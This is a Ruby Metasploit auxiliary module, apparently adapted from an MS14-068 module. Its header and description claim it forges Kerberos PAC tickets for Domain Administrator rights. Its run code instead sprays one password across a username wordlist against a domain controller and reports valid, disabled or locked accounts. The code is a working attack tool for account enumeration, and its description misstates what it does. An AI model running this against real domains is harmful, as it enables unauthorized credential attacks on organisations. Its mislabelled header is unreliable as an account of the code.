##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit4 < Msf::Auxiliary

 # include Msf::Auxiliary::AuthBrute 
  include Msf::Auxiliary::Report
  include Msf::Kerberos::Client
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'MS14-068 Microsfot Kerberos Checksum Validation Vulnerability',
      'Description' => %q{
        This module exploits a vulnerability in the Microsoft Kerberos implementation. The problem
        exists in the verification of the Privilege Attribute Certificate (PAC) from a Kerberos TGS
        request, where a domain user may forge a PAC with arbitrary privileges, including
        Domain Administrator. This module requests a TGT ticket with a forged PAC and exports it to
        a MIT Kerberos Credential Cache file. It can be loaded on Windows systems with the Mimikatz
        help. It has been tested successfully on Windows 2008.
      },
      'Author' =>
        [
          'Tom Maddock', # Vulnerability discovery
          'Sylvain Monne', # pykek framework and exploit
          'juan vazquez' # Metasploit module
        ],
      'References' =>
        [
          ['CVE', '2014-6324'],
          ['MSB', 'MS14-068'],
          ['OSVDB', '114751'],
          ['URL', 'http://blogs.technet.com/b/srd/archive/2014/11/18/additional-information-about-cve-2014-6324.aspx'],
          ['URL', 'https://labs.mwrinfosecurity.com/blog/2014/12/16/digging-into-ms14-068-exploitation-and-defence/'],
          ['URL', 'https://github.com/bidord/pykek'],
          ['URL', 'https://community.rapid7.com/community/metasploit/blog/2014/12/25/12-days-of-haxmas-ms14-068-now-in-metasploit']
        ],
      'License' => MSF_LICENSE,
      'DisclosureDate' => 'Nov 18 2014'
    ))

    register_options(
      [
        #OptString.new('USER', [ true, 'The Domain User' ]),
        OptString.new('USER_FILE',
          [
            true, 'The file that contains a list of probable users accounts.',
            File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_users.txt')
          ]),
        OptString.new('PASSWORD', [ true, 'The Domain User password' ]),
        OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
        #OptString.new('USER_SID', [ true, 'The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000'])
      ], self.class)
  end

  def run

    domain = datastore['DOMAIN'].upcase

    print_status("Using domain #{domain}...")


    unicode_password = Rex::Text.to_unicode(datastore['PASSWORD'])
    password_digest = OpenSSL::Digest.digest('MD4', unicode_password)

    pre_auth = []
    pre_auth << build_as_pa_time_stamp(key: password_digest, etype: Rex::Proto::Kerberos::Crypto::RC4_HMAC)
    pre_auth << build_pa_pac_request
    pre_auth

   usernames = extract_words(datastore['USER_FILE'])
   usernames.each {|user|
    #print_status("#{user}")
    # print_status("#{peer} - Testing User #{user}")
     res = send_request_as(
      client_name: "#{user}",
      server_name: "krbtgt/#{domain}",
      realm: "#{domain}",
      key: password_digest,
      pa_data: pre_auth
     )

      print_warning("#{peer} - #{user} - #{warn_error(res)}") if res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
      if ("#{warn_error(res)}") == "KDC_ERR_PREAUTH_FAILED - Pre-authentication information was invalid"
        print_good("#{peer} - #{user} is a Valid User")
      elsif ("#{warn_error(res)}") == "KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked"
        print_warning("#{peer} - #{user} is Disabled/Locked")
      end   
  }

  end
  def extract_words(wordfile)
    return [] unless wordfile && File.readable?(wordfile)
    words = File.open(wordfile, "rb") {|f| f.read}
    save_array = words.split(/\r?\n/)
    return save_array
  end
  def warn_error(res)
    msg = ''

    if Rex::Proto::Kerberos::Model::ERROR_CODES.has_key?(res.error_code)
      error_info = Rex::Proto::Kerberos::Model::ERROR_CODES[res.error_code]
      msg = "#{error_info[0]} - #{error_info[1]}"
    else
      msg = 'Unknown error'
    end

    msg
  end
end

